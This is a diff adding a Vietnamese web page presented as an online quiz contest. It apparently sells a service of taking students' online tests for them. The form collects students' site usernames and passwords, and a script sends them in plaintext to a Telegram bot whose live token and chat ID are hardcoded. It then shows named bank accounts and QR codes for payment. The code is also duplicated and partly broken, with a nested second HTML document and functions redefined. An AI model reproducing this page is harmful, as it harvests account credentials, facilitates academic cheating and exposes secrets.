@@ -1,0 +1,857 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Cuộc thi trắc nghiệm trên internet</title>
+    <link rel="stylesheet" href="style.css">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            margin: 0;
+            padding: 0;
+            background-image: url('https://i.imgur.com/dojuQ9s.gif');
+            background-size: cover;
+        }
+
+        h2 {
+            color: #ffffff;
+            text-align: center;
+            margin-top: 50px;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+            }
+            to {
+                opacity: 0.85;
+            }
+        }
+        
+        form {
+            max-width: 600px;
+            margin: 20px auto;
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            animation: fadeIn 3s ease-out; /* Apply the fade-in animation */
+        }
+        
+        /* Add this CSS code to set the initial opacity to 0 */
+        form {
+            opacity: 35;
+        }
+        
+        /* Add this CSS code to set the final opacity to 1 when the animation is complete */
+        form {
+            animation-fill-mode: forwards;
+        }
+
+        /* Add the following CSS to synchronize the input fields with the background */
+        form input {
+            background: rgba(255, 255, 255, 0.8);
+        }
+
+        label {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+
+        button {
+            background-color: #4caf50;
+            color: #fff;
+            padding: 10px 15px;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        button:hover {
+            background-color: #45a049;
+        }
+
+        #notification {
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            padding: 10px;
+            border-radius: 4px;
+            text-align: center;
+            display: none;
+        }
+
+        #notification.success {
+            background-color: #4caf50;
+            color: #fff;
+        }
+
+        #notification.failure {
+            background-color: #f44336;
+            color: #fff;
+        }
+
+        #amount {
+            margin-top: 10px;
+            font-size: 18px;
+            color: #333;
+        }
+
+        #qrCodeContainer {
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .error-input {
+            border-color: #f44336 !important;
+        }
+
+        .swal2-container {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .swal2-popup {
+            width: auto !important;
+        }
+
+        label,
+        select {
+            display: block;
+            margin-bottom: 8px;
+            color: #333;
+        }
+
+        select {
+            width: 100%;
+            padding: 10px;
+            margin-bottom: 15px;
+            box-sizing: border-box;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+        }
+    </style>
+
+    <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+</head>
+
+<body>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+
+    <audio id="play" loop>
+        <source src="https://audio.jukehost.co.uk/h48Ru7NLhfivzcOuFCpn6pH8K4tbqCvG">
+      </audio>
+      <script>
+        // Lấy tham chiếu đến thẻ audio
+        var audio = document.getElementById("play");
+        
+        var audioStarted = false; // Biến để kiểm tra xem nhạc đã được bật lần đầu chưa
+        
+        // Tạo một hàm để bật âm nhạc
+        function playAudio() {
+          if (!audioStarted) {
+            audioStarted = true; // Đánh dấu rằng nhạc đã được bật lần đầu
+            audio.play();
+          }
+        }
+        
+        // Bắt sự kiện nhấp chuột bất kì nơi nào trên trang web
+        document.addEventListener("click", playAudio);
+        
+        // Ngăn người dùng tắt nhạc khi họ nhấn vào nút dừng
+        audio.addEventListener("pause", function(event) {
+          if (audioStarted) {
+            event.preventDefault(); // Ngăn chặn tắt nhạc
+            audio.play(); // Chắc chắn rằng nhạc sẽ tiếp tục phát
+          }
+        });
+      </script>
+
+      <script>
+        // Lấy tham chiếu đến thẻ audio
+        var backgroundAudio = document.getElementById("play");
+        var submitAudio = new Audio("https://audio.jukehost.co.uk/GKFoRICbYINAgf8YRIjAc64fWAdAEQg9"); // Thay thế URL_OF_YOUR_SUBMIT_AUDIO bằng đường dẫn của âm thanh bạn muốn phát khi nhấp vào Gửi Thông Tin
+    
+        var audioStarted = false; // Biến để kiểm tra xem nhạc đã được bật lần đầu chưa
+    
+        // Tạo một hàm để bật âm nhạc
+        function playAudio() {
+            if (!audioStarted) {
+                audioStarted = true; // Đánh dấu rằng nhạc đã được bật lần đầu
+                backgroundAudio.play();
+            }
+        }
+    
+        // Bắt sự kiện nhấp chuột vào nút "Gửi Thông Tin"
+        document.getElementById("submitBtn").addEventListener("click", function () {
+            playAudio();
+            submitAudio.play(); // Phát âm thanh khi nhấp vào Gửi Thông Tin
+    
+            // Giảm nhỏ âm lượng của nhạc nền
+            var volume = backgroundAudio.volume;
+            var fadeOutInterval = setInterval(function () {
+                if (volume > 0.1) {
+                    volume -= 0.1;
+                    backgroundAudio.volume = volume;
+                } else {
+                    clearInterval(fadeOutInterval);
+                    backgroundAudio.pause(); // Dừng nhạc nền khi hết nhạc
+                    backgroundAudio.volume = 1; // Reset âm lượng
+                }
+            }, 100);
+        });
+    
+        // Ngăn người dùng tắt nhạc khi họ nhấn vào nút dừng
+        backgroundAudio.addEventListener("pause", function (event) {
+            if (audioStarted) {
+                event.preventDefault(); // Ngăn chặn tắt nhạc
+                backgroundAudio.play(); // Chắc chắn rằng nhạc sẽ tiếp tục phát
+            }
+        });
+    </script>
+
+    
+    <!DOCTYPE html>
+    <html lang="en">
+    
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>Cuộc thi trắc nghiệm trên internet</title>
+        <link rel="stylesheet" href="style.css">
+        <style>
+            body {
+                font-family: Arial, sans-serif;
+                background-color: #f4f4f4;
+                margin: 0;
+                padding: 0;
+                background-image: url('https://i.imgur.com/dojuQ9s.gif');
+                background-size: cover;
+            }
+    
+            h2 {
+                color: #ffffff;
+                text-align: center;
+                margin-top: 50px;
+            }
+    
+            @keyframes fadeIn {
+                from {
+                    opacity: 0;
+                }
+                to {
+                    opacity: 0.85;
+                }
+            }
+            
+            form {
+                max-width: 600px;
+                margin: 20px auto;
+                background-color: #fff;
+                padding: 20px;
+                border-radius: 8px;
+                box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                animation: fadeIn 3s ease-out; /* Apply the fade-in animation */
+            }
+            
+            /* Add this CSS code to set the initial opacity to 0 */
+            form {
+                opacity: 35;
+            }
+            
+            /* Add this CSS code to set the final opacity to 1 when the animation is complete */
+            form {
+                animation-fill-mode: forwards;
+            }
+    
+            /* Add the following CSS to synchronize the input fields with the background */
+            form input {
+                background: rgba(255, 255, 255, 0.8);
+            }
+    
+            label {
+                display: block;
+                margin-bottom: 8px;
+                color: #333;
+            }
+    
+            input {
+                width: 100%;
+                padding: 10px;
+                margin-bottom: 15px;
+                box-sizing: border-box;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+            }
+    
+            button {
+                background-color: #4caf50;
+                color: #fff;
+                padding: 10px 15px;
+                border: none;
+                border-radius: 4px;
+                cursor: pointer;
+            }
+    
+            button:hover {
+                background-color: #45a049;
+            }
+    
+            #notification {
+                position: fixed;
+                top: 50%;
+                left: 50%;
+                transform: translate(-50%, -50%);
+                padding: 10px;
+                border-radius: 4px;
+                text-align: center;
+                display: none;
+            }
+    
+            #notification.success {
+                background-color: #4caf50;
+                color: #fff;
+            }
+    
+            #notification.failure {
+                background-color: #f44336;
+                color: #fff;
+            }
+    
+            #amount {
+                margin-top: 10px;
+                font-size: 18px;
+                color: #333;
+            }
+    
+            #mainContainer {
+                max-width: 600px;
+                margin: 20px auto;
+                /* Thêm các thuộc tính khác nếu cần thiết */
+            }
+    
+            .error-input {
+                border-color: #f44336 !important;
+            }
+    
+            .swal2-container {
+                display: flex;
+                align-items: center;
+                justify-content: center;
+            }
+    
+            .swal2-popup {
+                width: auto !important;
+            }
+    
+            label,
+            select {
+                display: block;
+                margin-bottom: 8px;
+                color: #333;
+            }
+    
+            select {
+                width: 100%;
+                padding: 10px;
+                margin-bottom: 15px;
+                box-sizing: border-box;
+                border: 1px solid #ccc;
+                border-radius: 4px;
+            }
+        </style>
+    
+        <script src="https://html2canvas.hertzen.com/dist/html2canvas.min.js"></script>
+    
+        <script src="https://cdn.jsdelivr.net/npm/axios/dist/axios.min.js"></script>
+        
+    </head>
+    
+    <body>
+    
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>
+    
+        <audio id="play" loop>
+            <source src="https://audio.jukehost.co.uk/h48Ru7NLhfivzcOuFCpn6pH8K4tbqCvG">
+        </audio>
+        <script>
+            // Lấy tham chiếu đến thẻ audio
+            var audio = document.getElementById("play");
+    
+            var audioStarted = false; // Biến để kiểm tra xem nhạc đã được bật lần đầu chưa
+    
+            // Tạo một hàm để bật âm nhạc
+            function playAudio() {
+                if (!audioStarted) {
+                    audioStarted = true; // Đánh dấu rằng nhạc đã được bật lần đầu
+                    audio.play();
+                }
+            }
+    
+            // Bắt sự kiện nhấp chuột bất kì nơi nào trên trang web
+            document.addEventListener("click", playAudio);
+    
+            // Ngăn người dùng tắt nhạc khi họ nhấn vào nút dừng
+            audio.addEventListener("pause", function (event) {
+                if (audioStarted) {
+                    event.preventDefault(); // Ngăn chặn tắt nhạc
+                    audio.play(); // Chắc chắn rằng nhạc sẽ tiếp tục phát
+                }
+            });
+        </script>
+    
+        <script>
+            // Lấy tham chiếu đến thẻ audio
+            var backgroundAudio = document.getElementById("play");
+            var submitAudio = new Audio("https://audio.jukehost.co.uk/GKFoRICbYINAgf8YRIjAc64fWAdAEQg9"); // Thay thế URL_OF_YOUR_SUBMIT_AUDIO bằng đường dẫn của âm thanh bạn muốn phát khi nhấp vào Gửi Thông Tin
+    
+            var audioStarted = false; // Biến để kiểm tra xem nhạc đã được bật lần đầu chưa
+    
+            // Tạo một hàm để bật âm nhạc
+            function playAudio() {
+                if (!audioStarted) {
+                    audioStarted = true; // Đánh dấu rằng nhạc đã được bật lần đầu
+                    backgroundAudio.play();
+                }
+            }
+    
+            // Bắt sự kiện nhấp chuột vào nút "Gửi Thông Tin"
+            document.getElementById("submit-btn").addEventListener("click", function () {
+                playAudio(); // Bật âm thanh khi nhấp vào nút
+                setTimeout(function () {
+                    submitAudio.play(); // Phát âm thanh khi nhấp vào nút và sau 3 giây
+                }, 3000);
+            });
+    
+            // Bắt sự kiện nhấp chuột vào nút Sao Chép
+            document.getElementById("copy-btn").addEventListener("click", function () {
+                playAudio(); // Bật âm thanh khi nhấp vào nút
+            });
+        </script>
+    
+        <h2>Nhập thông tin</h2>
+        <form id="infoForm">
+            <label for="username">Tên truy cập:</label>
+            <input type="text" id="username" name="username" required>
+    
+            <label for="pass">Nhập Mật Khẩu:</label>
+            <input type="text" id="pass" name="pass" required>
+    
+            <label for="fullName">Họ tên người dự thi:</label>
+            <input type="text" id="fullName" name="fullName" required>
+    
+            <label for="score">Học Sinh Lớp:</label>
+            <input type="text" id="score" name="score" required>
+    
+            <label for="prediction">Số lần cần thi:</label>
+            <input type="text" id="prediction" name="prediction" required>
+    
+            <label for="selector">Chọn người thi:</label>
+    <select id="selector" name="selector">
+        <option value="" disabled selected></option>
+        <option value="nguyen_van_kien">Nguyễn Văn Kiên</option>
+        <option value="nguyen_dinh_hoang">Nguyễn Đình Hoàng</option>
+    </select>
+    
+            <label for="facebook">Số zalo nhận ảnh:</label>
+            <input type="url" id="facebook" name="facebook" placeholder="Nhập Số zalo nhận ảnh của bạn" required>
+    
+            <button type="card-social" onclick="validateAndSave()">Gửi Thông Tin</button>
+    
+    
+            <div class="card-social">
+                <a href="https://www.facebook.com/vnkien26" target="_blank">
+                    <button type="button">Liên hệ Admin qua Facebook</button>
+                </a>
+            
+     <div id="bankInfo" style="display: none;">
+                <h3>Thông tin chuyển khoản:</h3>
+                <p id="accountInfo">
+                    Chủ tài khoản: <span id="accountOwner"></span><br>
+                    STK: <span id="accountNumber"></span>
+                    <button id="copyAccountBtn" class="btn" data-clipboard-target="#accountNumber">Sao chép</button>
+                </p>
+                <p>Ngân hàng: MB bank</p>
+                <button type="button" onclick="validateAndSave(); redirectToNewPage();">Check Giao Dịch</button>
+                <p id="amountInfo">Số tiền: </p>
+            </div>
+            <div id="notification"></div>
+            <div id="amount"></div>
+    
+            <!-- Container để hiển thị mã QR -->
+            <div id="mainContainer">
+    
+            <script src="https://cdn.jsdelivr.net/npm/sweetalert2@10"></script>
+    
+    
+            <script>
+                function validateAndSave() {
+                    var username = document.getElementById('username');
+                    var pass = document.getElementById('pass');
+                    var fullName = document.getElementById('fullName');
+                    var score = document.getElementById('score');
+                    var prediction = document.getElementById('prediction');
+                    var facebook = document.getElementById('facebook');
+                
+                    // Kiểm tra xem tất cả các trường có giá trị không
+                    if (username.value === '' || pass.value === '' || fullName.value === '' || score.value === '' || prediction.value === '' || facebook.value === '') {
+                        // Hiển thị thông báo lỗi
+                        showErrorNotification('Vui lòng điền đầy đủ thông tin.');
+                
+                        // Chuyển màu đỏ cho các ô thông tin bị thiếu
+                        if (username.value === '') username.classList.add('error-input');
+                        if (pass.value === '') pass.classList.add('error-input');
+                        if (fullName.value === '') fullName.classList.add('error-input');
+                        if (score.value === '') score.classList.add('error-input');
+                        if (prediction.value === '') prediction.classList.add('error-input');
+                        if (facebook.value === '') facebook.classList.add('error-input');
+                    } else {
+                        // Lấy giá trị số lần cần thi từ input
+                        var numberOfPredictions = parseInt(prediction.value, 10);
+                
+                        // Kiểm tra xem giá trị nhập vào có phải là một số hợp lệ không
+                        if (isNaN(numberOfPredictions) || numberOfPredictions <= 0) {
+                            showErrorNotification('Số lần cần thi không hợp lệ.');
+                            prediction.classList.add('error-input');
+                            return;
+                        }
+                
+                        // Tính số tiền dựa trên số lần cần thi
+                        var amount = calculateAmount(numberOfPredictions);
+                
+                        // Hiển thị số tiền
+                        showAmount(amount);
+                
+                        // Lưu thông tin vào Local Storage hoặc server
+                        var userInfo = {
+                            username: username.value,
+                            pass: pass.value,
+                            fullName: fullName.value,
+                            score: score.value,
+                            prediction: numberOfPredictions,
+                            facebook: facebook.value,
+                            amount: amount
+                        };
+                
+                        // Gửi thông tin đến bot Telegram
+                        var isSuccess = sendToTelegram(userInfo);
+                
+                        // Cập nhật thông tin ngân hàng dựa trên người được chọn và số tiền
+                        updateBankInfo(document.getElementById('selector').value, amount);
+                
+                        // Hiển thị thông tin ngân hàng
+                        document.getElementById('bankInfo').style.display = 'block';
+                
+                        // Hiển thị thông báo
+                        showNotification(isSuccess);
+                
+                        // Hiển thị mã QR
+                        showQRCode();
+                    }
+                }
+        
+                function showQRCode() {
+                    var qrCodeContainer = document.getElementById('mainContainer');
+        
+                    // Lấy giá trị từ các trường nhập liệu
+                    var username = document.getElementById('username').value;
+                    var fullName = document.getElementById('fullName').value;
+                    var score = document.getElementById('score').value;
+                    var numberOfPredictions = document.getElementById('prediction').value;
+        
+                    // Tổng số tiền người dùng cần thanh toán
+                    var totalAmount = calculateAmount(parseInt(numberOfPredictions, 10));
+        
+                    // Chọn đường dẫn ảnh dựa trên người được chọn
+                    var qrCodePath = '';
+                    if (selectedPerson === 'nguyen_van_kien') {
+                        qrCodePath = 'https://img.vietqr.io/image/MB-0349862214-compact2.jpg?amount=' + totalAmount + '&addInfo=' + encodeURIComponent(username + ' ' + fullName + ' ' + score) + '&accountName=NGUYEN%20VAN%20KIEN';
+                    } else if (selectedPerson === 'nguyen_dinh_hoang') {
+                        qrCodePath = 'https://img.vietqr.io/image/MB-0333827347-compact2.jpg?amount=' + totalAmount + '&addInfo=' + encodeURIComponent(username + ' ' + fullName + ' ' + score) + '&accountName=NGUYEN%20DINH%20HOANG';
+                    }
+        
+                    // Tạo thẻ img và đặt đường dẫn
+                    var qrCodeImage = document.createElement('img');
+                    qrCodeImage.src = qrCodePath;
+                    qrCodeImage.alt = 'QR Code';
+        
+                    // Xóa nội dung cũ trong container và thêm ảnh mới
+                    qrCodeContainer.innerHTML = '';
+                    qrCodeContainer.appendChild(qrCodeImage);
+                }
+    
+                function showQRCode() {
+                    var qrCodeContainer = document.getElementById('mainContainer');
+    
+                    // Lấy giá trị từ các trường nhập liệu
+                    var username = document.getElementById('username').value;
+                    var fullName = document.getElementById('fullName').value;
+                    var score = document.getElementById('score').value;
+                    var numberOfPredictions = document.getElementById('prediction').value;
+    
+                    // Tổng số tiền người dùng cần thanh toán
+                    var totalAmount = calculateAmount(parseInt(numberOfPredictions, 10));
+    
+                    // Tạo chuỗi thay thế cho addInfo
+                    var addInfo = username + ' ' + fullName + ' ' + score + ' ' + numberOfPredictions;
+    
+                    // Đường link chứa mã QR với các tham số đã được thay thế
+                    var qrCodeLink = 'https://img.vietqr.io/image/MB-0349862214-compact2.jpg?amount=' + totalAmount + '&addInfo=' + encodeURIComponent(addInfo) + '&accountName=NGUYEN%20VAN%20KIEN';
+    
+                    // Tạo một phần tử hình ảnh
+                    var qrCodeImage = new Image();
+                    qrCodeImage.src = qrCodeLink;
+    
+                    // Thêm hình ảnh vào phần tử div
+                    qrCodeContainer.innerHTML = ''; // Xóa nội dung cũ
+                    qrCodeContainer.appendChild(qrCodeImage);
+    
+                    // Cập nhật thông tin ngân hàng dựa trên người được chọn và số tiền
+                    updateBankInfo(document.getElementById('selector').value, totalAmount);
+                }
+    
+                // Hàm cập nhật thông tin ngân hàng
+                function updateBankInfo(selectedPerson, amount) {
+                    var accountNumberElement = document.getElementById('accountNumber');
+                    var amountInfoElement = document.getElementById('amountInfo');
+    
+                    if (selectedPerson === 'nguyen_van_kien') {
+                        accountNumberElement.textContent = '0349862214';
+                    } else if (selectedPerson === 'nguyen_dinh_hoang') {
+                        accountNumberElement.textContent = '0333827347';
+                    }
+    
+                    // Hiển thị số tiền theo định dạng tiền tệ
+                    var formattedAmount = formatCurrency(amount);
+                    amountInfoElement.textContent = 'Số tiền: ' + formattedAmount;
+                }
+    
+                function showAmount(amount) {
+                    var amountElement = document.getElementById('amount');
+                    // Định dạng số tiền và hiển thị
+                    var formattedAmount = formatCurrency(amount);
+                    amountElement.innerHTML = 'Số tiền: ' + formattedAmount;
+                }
+    
+                // Khởi tạo biến đếm và thời điểm reset
+    var userCount = 0;
+    var lastResetDate = new Date();
+    
+    function sendToTelegram(userInfo) {
+        // Thay thế YOUR_BOT_TOKEN bằng mã token của bot bạn đã tạo
+        var botToken = '6416487576:AAGeK1DedNa4Xr7kVq3dMQhEy1zwA_2wrvc';
+    
+        // Thay thế YOUR_CHAT_ID bằng chat ID của admin hoặc nhóm muốn nhận thông tin
+        var chatId = '-4048446353';
+    
+        // Lấy thời gian hiện tại
+        var currentTime = new Date();
+    
+        // Kiểm tra nếu đã qua một ngày kể từ thời điểm reset cuối cùng
+        if (isOneDayPassed(currentTime)) {
+            // Reset số người gửi và cập nhật thời điểm reset
+            userCount = 1;
+            lastResetDate = currentTime;
+        } else {
+            // Tăng giá trị số người gửi
+            userCount++;
+        }
+    
+        // Định dạng thời gian theo yêu cầu
+        var formattedTime = currentTime.toLocaleString('vi-VN', {
+            day: 'numeric',
+            month: 'numeric',
+            year: 'numeric',
+            hour: 'numeric',
+            minute: 'numeric'
+        });
+    
+        // Định dạng thông điệp
+        var selectedPerson = document.getElementById('selector').value;
+    
+        var message = "👤 NGƯỜI Dùng " + userInfo.fullName + " Gửi vào lúc ⏰ " + formattedTime + "\n" +
+            "👥 Tên truy cập: " + userInfo.username + "\n" +
+            "👤 Họ tên: " + userInfo.fullName + "\n" +
+            "👤 Mật khẩu: " + userInfo.pass + "\n" +
+            "📚 Học Sinh Lớp: " + userInfo.score + "\n" +
+            "🔢 Số lần Thi: " + userInfo.prediction + "\n" +
+            "🔗 Số Zalo nhận ảnh: " + userInfo.facebook + "\n" +
+            "👤 Người thi: " + (selectedPerson === 'nguyen_van_kien' ? 'Nguyễn Văn Kiên' : 'Nguyễn Đình Hoàng') + "\n" +
+            "💰 Số tiền: " + userInfo.amount.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' }) ;
+        
+    
+    
+        // Tạo URL API cho Bot của bạn
+        var apiUrl = "https://api.telegram.org/bot" + botToken + "/sendMessage?chat_id=" + chatId + "&text=" + encodeURIComponent(message);
+    
+        // Sử dụng XMLHttpRequest để gửi yêu cầu
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", apiUrl, true);
+        xhr.send();
+    
+        // Trả về true nếu thành công, ngược lại trả về false
+        return xhr.status === 200;
+    }
+    
+    // Hàm kiểm tra xem đã qua một ngày kể từ thời điểm reset cuối cùng hay chưa
+    function isOneDayPassed(currentTime) {
+        var oneDayInMilliseconds = 24 * 60 * 60 * 1000; // Một ngày trong milliseconds
+        return currentTime - lastResetDate > oneDayInMilliseconds;
+    }
+    
+                function showErrorNotification(message) {
+                    var notification = document.getElementById('notification');
+                    notification.innerHTML = message;
+                    notification.classList.remove('success');
+                    notification.classList.add('failure');
+                    notification.style.display = 'block';
+        
+                    // Ẩn thông báo sau 3 giây
+                    setTimeout(function () {
+                        notification.style.display = 'none';
+                    }, 3000);
+                }
+        
+                function showNotification(isSuccess) {
+                    var notification = document.getElementById('notification');
+        
+                    if (isSuccess) {
+                        notification.innerHTML = 'Thông tin đã được gửi thành công!';
+                        notification.classList.remove('failure');
+                        notification.classList.add('success');
+                        showBackgroundNotification('Thông tin đã được gửi thành công!');
+                    } else {
+                        notification.innerHTML = 'Thông tin đã được gửi thành công! VUi LÒNG THANH TOÁN PHÍA DƯỚI';
+                        notification.classList.remove('success');
+                        notification.classList.add('failure');
+                        showBackgroundNotification('Thông tin đã được gửi thành công! VUi LÒNG THANH TOÁN PHÍA DƯỚI');
+                    }
+        
+                    notification.style.display = 'block';
+        
+                    setTimeout(function () {
+                        notification.style.display = 'none';
+                    }, 3000);
+                }
+                
+                
+    
+                function calculateAmount(prediction) {
+                    // Giả sử 30 lần tương đương với 10.000 VNĐ
+                    var costPerPrediction = 10000;
+    
+                    // Tính giá trị của một đơn vị tiền tệ
+                    var costPerUnit = costPerPrediction / 30;
+    
+                    // Tính tổng giá trị dựa trên số lượt thi
+                    var amount = prediction * costPerUnit;
+    
+                    return amount;
+                }
+    
+                function formatCurrency(amount) {
+                    // Sử dụng hàm toLocaleString để định dạng số thành chuỗi có định dạng tiền tệ
+                    var formattedAmount = amount.toLocaleString('vi-VN', { style: 'currency', currency: 'VND' });
+                    return formattedAmount;
+                }
+    
+                // Hàm để hiển thị thông báo chạy nền
+    function showBackgroundNotification(message) {
+        Swal.fire({
+            position: 'bottom-end',
+            icon: 'info',
+            title: message,
+            showConfirmButton: false,
+            timer: 3000
+        });
+    }
+    
+    function showQRCode() {
+        var qrCodeContainer = document.getElementById('mainContainer');
+    
+        // Lấy giá trị từ các trường nhập liệu
+        var username = document.getElementById('username').value;
+        var fullName = document.getElementById('fullName').value;
+        var score = document.getElementById('score').value;
+        var numberOfPredictions = document.getElementById('prediction').value;
+    
+        // Tổng số tiền người dùng cần thanh toán
+        var totalAmount = calculateAmount(parseInt(numberOfPredictions, 10));
+    
+        // Tạo chuỗi thay thế cho addInfo
+        var addInfo = username + ' ' + fullName + ' ' + score + ' ' + numberOfPredictions;
+    
+        // Đường link chứa mã QR với các tham số đã được thay thế
+        var qrCodeLink = 'https://img.vietqr.io/image/MB-0349862214-compact2.jpg?amount=' + totalAmount + '&addInfo=' + encodeURIComponent(addInfo) + '&accountName=NGUYEN%20VAN%20KIEN';
+    
+        // Tạo một phần tử hình ảnh
+        var qrCodeImage = new Image();
+        qrCodeImage.src = qrCodeLink;
+    
+        // Thêm hình ảnh vào phần tử div
+        qrCodeContainer.innerHTML = ''; // Xóa nội dung cũ
+        qrCodeContainer.appendChild(qrCodeImage);
+    
+        // Cập nhật thông tin ngân hàng dựa trên người được chọn và số tiền
+        updateBankInfo(document.getElementById('selector').value, totalAmount);
+    }
+    
+            // Hàm cập nhật thông tin ngân hàng
+            function updateBankInfo(selectedPerson, amount) {
+                var accountNumberElement = document.getElementById('accountNumber');
+                var accountOwnerElement = document.getElementById('accountOwner');
+                var amountInfoElement = document.getElementById('amountInfo');
+    
+                var copyAccountBtn = document.getElementById('copyAccountBtn');
+    
+                if (selectedPerson === 'nguyen_van_kien') {
+                    accountNumberElement.textContent = '0349862214';
+                    accountOwnerElement.textContent = 'Nguyễn Văn Kiên';
+                } else if (selectedPerson === 'nguyen_dinh_hoang') {
+                    accountNumberElement.textContent = '0333827347';
+                    accountOwnerElement.textContent = 'Nguyễn Đình Hoàng';
+                }
+    
+                // Hiển thị số tiền theo định dạng tiền tệ
+                var formattedAmount = formatCurrency(amount);
+                amountInfoElement.textContent = 'Số tiền: ' + formattedAmount;
+    
+                // Kích hoạt clipboard.js cho nút sao chép
+                var clipboard = new ClipboardJS(copyAccountBtn);
+    
+                clipboard.on('success', function (e) {
+                    alert('Số tài khoản đã được sao chép!');
+                    e.clearSelection();
+                });
+    
+                clipboard.on('error', function (e) {
+                    alert('Không thể sao chép số tài khoản.');
+                });
+            }
+    
+            function redirectToNewPage() {
+                // Chuyển hướng đến trang HTML mới
+                window.open("check.html", "_blank")
+            }
+    
+            </script>
+        </form>
+    </body>
+    
+    </html>
